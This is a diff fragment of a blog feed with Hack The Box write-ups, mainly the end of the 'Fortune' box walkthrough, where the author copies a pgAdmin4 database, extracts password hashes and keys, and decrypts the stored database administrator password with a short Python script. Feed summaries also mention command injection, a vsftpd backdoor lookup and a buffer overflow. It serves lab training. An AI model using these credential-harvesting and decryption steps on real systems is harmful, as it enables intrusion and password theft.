+&lt;h4 id=&quot;note--pgadmin-is-an-administration-and-development-platform-for-postgresql&quot;&gt;Note : &lt;a href=&quot;https://www.pgadmin.org/&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin&lt;/code&gt;&lt;/a&gt; is an administration and development platform for &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;earlier-when-we-got-the-elevated-network-access-there-was-an-http-port-for-pgadmin4-so-i-checked-its-web-directory-in-varappsrv-and-the-database-was-there-&quot;&gt;Earlier when we got the elevated network access there was an &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port for &lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin4&lt;/code&gt; so I checked its web directory in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/appsrv&lt;/code&gt; and the database was there :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fortune$ cd /var/appsrv/                                                                                                                                                                                          
+fortune$ ls -la
+total 20
+drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
+drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
+drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune
+drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
+drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth
+fortune$ cd pgadmin4/                                                                                                                                                                                             
+fortune$ ls -la
+total 252
+drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .
+drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..
+-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db
+-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini
+drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
+drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
+fortune$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-downloaded-it-on-my-machine-&quot;&gt;I downloaded it on my machine :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
+pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
+root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-used-strings-to-see-if-i-can-get-anything-interesting-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; to see if I can get anything interesting :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
+SQLite format 3
+indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments
+
+----------------
+ Removed Output
+----------------
+
+ConfigDB
+	ConfigDB
+bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
+charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
+bob@fortune.htb
+3	charlie@fortune.htb
+
+----------------
+ Removed Output
+----------------
+
+9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9
+!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?
+-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=
+
+----------------
+ Removed Output
+----------------
+
+8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&amp;lt;STORAGE_DIR&amp;gt;/.postgresql/postgresql.crt&amp;lt;STORAGE_DIR&amp;gt;/.postgresql/postgresql.key22
+
+----------------
+ Removed Output
+----------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-got-some-salted-hashes-and-most-importantly-this-&quot;&gt;I got some salted hashes, and most importantly this :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-is-the-db-administrators-password-hash-and-we-know-that-its-the-same-as-the-root-password&quot;&gt;This is the db administrator’s password hash and we know that it’s the same as the root password.&lt;/h4&gt;
+&lt;h4 id=&quot;pgadmin-is-an-open-source-software-so-i-searched-on-github-for-any-cryptography-related-stuff-and-found-this-script-called-cryptopy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin&lt;/code&gt; is an open-source software so I searched on &lt;code class=&quot;highlighter-rouge&quot;&gt;github&lt;/code&gt; for any cryptography related stuff and found this script called &lt;a href=&quot;https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;crypto.py&lt;/code&gt;&lt;/a&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;i-took-the-functions-needed-to-decrypt-the-hash-then-i-created-a-script-to-take-the-hashthe-key-and-decrypt-the-hash-using-the-functions-from-cryptopy&quot;&gt;I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from &lt;code class=&quot;highlighter-rouge&quot;&gt;crypto.py&lt;/code&gt;:&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;division&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;six&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.backends&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_backend&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cipher&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers.algorithms&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cryptography.hazmat.primitives.ciphers.modes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFB8&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'}'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Add padding to the key.&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;six&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# Key must be maximum 32 bytes long, so take first 32 bytes&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# If key size is 16, 24 or 32 bytes then padding is not required&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# Add padding to make key 32 bytes long&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    Decrypt the AES encrypted string.
+
+    Parameters:
+        ciphertext -- Encrypted string with AES method.
+        key        -- key to decrypt the encrypted string.
+    &quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFB8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_backend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;finalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hash : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;key : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Password : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-only-thing-left-is-to-give-the-right-key-i-tried-the-other-hashes-i-got-from-the-database-as-a-key-and-bobs-hash-worked-&quot;&gt;The only thing left is to give the right key, I tried the other hashes I got from the database as a key and &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s hash worked :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# ./decrypt.py 
+hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
+key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
+[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+root@kali:~/Desktop/HTB/boxes/fortune# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lacasadepapel&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lacasadepapel/&quot;&gt;Hack The Box - LaCasaDePapel&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="BSD" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="Networking" /><category term="Pivoting ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/fortune/0.png" /></entry><entry><title type="html">Hack The Box - LaCasaDePapel</title><link href="http://localhost:4000/hack-the-box/lacasadepapel/" rel="alternate" type="text/html" title="Hack The Box - LaCasaDePapel" /><published>2019-07-27T00:00:00+02:00</published><updated>2019-07-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lacasadepapel</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lacasadepapel/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-lacasadepapel-retired-and-heres-my-write-up-about-it-it-was-an-easy-interesting-box-more-of-a-ctf-challenge-than-a-realistic-scenario-but-i-still-enjoyed-it-its-a-linux-box-and-its-ip-is-101010131-i-added-it-to-etchosts-as-lacasadepapelhtb-lets-jump-right-in-&quot;&gt;Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.131&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lacasadepapel.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -399,6 +1028,7 @@ lacasadepapel [~]$
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---ctf&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ctf/&quot;&gt;Hack The Box - CTF&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---fortune&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/fortune/&quot;&gt;Hack The Box - Fortune&lt;/a&gt;&lt;/h4&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is 10.10.10.131, I added it to /etc/hosts as lacasadepapel.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lacasadepapel.htb We have http on port 80. https on port 443, ftp on port 21 and ssh on port 22. Anonymous authentication wasn’t allowed on ftp so I checked http and https : root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb Connected to lacasadepapel.htb. 220 (vsFTPd 2.3.4) Name (lacasadepapel.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; HTTP http://lacasadepapel.htb We see an image of the characters from LaCasaDePapel (TV show) and a QR code for OTP, I scanned it with Google Authenticator on my phone : As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the OTP and used test@test.com as email : Then nothing happened, I just got the same page back again. I tried gobuster to see if I can find any sub directories and I didn’t get anything useful. Let’s check https. https://lacasadepapel.htb The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.” vsftpd 2.3.4, Psy Shell After hitting dead ends with web, I checked the ftp service again, the version was vsftpd 2.3.4 (from the nmap scan) so I searched for exploits : root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | exploits/unix/remote/17491.rb -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Command Execution and there is a metasploit module for it, but the exploit didn’t work : ``` msf5 &amp;gt; search vsftpd 2.3.4</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lacasadepapel/0.png" /></entry><entry><title type="html">Hack The Box - CTF</title><link href="http://localhost:4000/hack-the-box/ctf/" rel="alternate" type="text/html" title="Hack The Box - CTF" /><published>2019-07-20T00:00:00+02:00</published><updated>2019-07-20T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/ctf</id><content type="html" xml:base="http://localhost:4000/hack-the-box/ctf/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
@@ -3940,515 +4570,4 @@ int main(int argc, char* argv[]){
 &lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
 &lt;h4 id=&quot;previous-pwn-write-up--pwnablekr---fd&quot;&gt;Previous pwn write-up : &lt;a href=&quot;/pwn/fd/&quot;&gt;pwnable.kr - fd&lt;/a&gt;&lt;/h4&gt;
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Binary Exploitation" /><category term="Buffer Overflow" /><category term="code analysis" /><category term="Exploit Development" /><category term="c" /><category term="Python" /><summary type="html">Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/bof/0.png" /></entry><entry><title type="html">Hack The Box - Help</title><link href="http://localhost:4000/hack-the-box/help/" rel="alternate" type="text/html" title="Hack The Box - Help" /><published>2019-06-08T00:00:00+02:00</published><updated>2019-06-08T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/help</id><content type="html" xml:base="http://localhost:4000/hack-the-box/help/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
